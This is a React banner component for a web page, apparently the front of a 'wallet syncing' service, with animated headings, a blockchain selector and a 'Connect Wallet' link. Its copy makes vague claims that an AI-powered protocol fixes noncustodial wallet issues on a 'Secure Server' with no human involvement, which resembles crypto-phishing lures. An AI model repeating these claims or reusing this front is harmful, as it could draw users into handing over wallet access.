import React, { useEffect, useRef, useState } from "react";
import { motion, useAnimation, useInView } from "framer-motion";
import { Link } from "react-router-dom";
import SlideInNotifications from "./SlideInNotification";

const Banner = () => {
  const ref = useRef(null);
  const isInView = useInView(ref);
  const [selectedChain, setSelectedChain] = useState(null);

  const mainControls = useAnimation();
  const slideControls = useAnimation();

  useEffect(() => {
    if (isInView) {
      mainControls.start("visible");
      slideControls.start("visible");
    }
  }, [isInView, mainControls, slideControls]);

  const handleSelectChange = (event) => {
    setSelectedChain(event.target.value);
  };

  return (
    <motion.div
      ref={ref}
      variants={{
        hidden: { opacity: 0, y: 75 },
        visible: { opacity: 1, y: 0 },
      }}
      initial="hidden"
      animate={mainControls}
      transition={{ duration: 1, delay: 0.5 }}
      className="flex flex-col gap-8 items-center dots justify-center w-full pt-14 pb-14"
    >
      <div className="glass p-2 shadow-2xl px-4 rounded-full">
        <h4 className="font-bold text-[#aaa] flex items-center justify-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="#ddd" className="w-6 h-6">
  <path strokeLinecap="round" strokeLinejoin="round" d="m21 7.5-2.25-1.313M21 7.5v2.25m0-2.25-2.25 1.313M3 7.5l2.25-1.313M3 7.5l2.25 1.313M3 7.5v2.25m9 3 2.25-1.313M12 12.75l-2.25-1.313M12 12.75V15m0 6.75 2.25-1.313M12 21.75V19.5m0 2.25-2.25-1.313m0-16.875L12 2.25l2.25 1.313M21 14.25v2.25l-2.25 1.313m-13.5 0L3 16.5v-2.25" />
</svg>
 Decentralized Protocol</h4>
      </div>

      <div className="lg:w-2/3 mt-6 md:px-4 text-white px-4">
        <h1 className="md:text-5xl text-3xl font-bold text-center">
          Decentralized protocol for syncing various Wallets issues on Secure
          Server.
        </h1>

        <p className="md:text-xl text-lg px-2 md:px-0 text-gray-300 mt-12 text-center lg:w-9/12 mx-auto">
          Our AI-powered protocol ensures seamless connectivity and secure asset
          management by resolving synchronization challenges across noncustodial
          wallets with no human intervention.
        </p>
      </div>

      <motion.div
        ref={ref}
        variants={{
          hidden: { opacity: 0, y: 90 },
          visible: { opacity: 1, y: 0 },
        }}
        initial="hidden"
        animate={mainControls}
        transition={{ duration: 1.2, delay: 0.8 }}
        className="flex flex-row-reverse gap-4 mt-6"
      >
        <div className="p-1 rounded-xl bg-gray-400">
          <button className="btn btn-grad px-4 md:px-6 rounded-lg text-lg">
            <Link to="/connect">Connect Wallet</Link>
          </button>
        </div>

        <div className="p-1 glass rounded-xl bg-indigo-500">
          <select
            onChange={handleSelectChange}
            className="select rounded-lg bg-gray-200 text-blue-800 w-full text-lg max-w-xs"
          >
            <option disabled selected>
              Select Chain
            </option>
            <option>Ethereum</option>
            <option>Binance</option>
            <option>Polygon</option>
            <option>Avalanche</option>
            <option>Fantom</option>
          </select>
        </div>
        {selectedChain && (
          <SlideInNotifications selectedChain={selectedChain} />
        )}
      </motion.div>
    </motion.div>
  );
};

export default Banner;
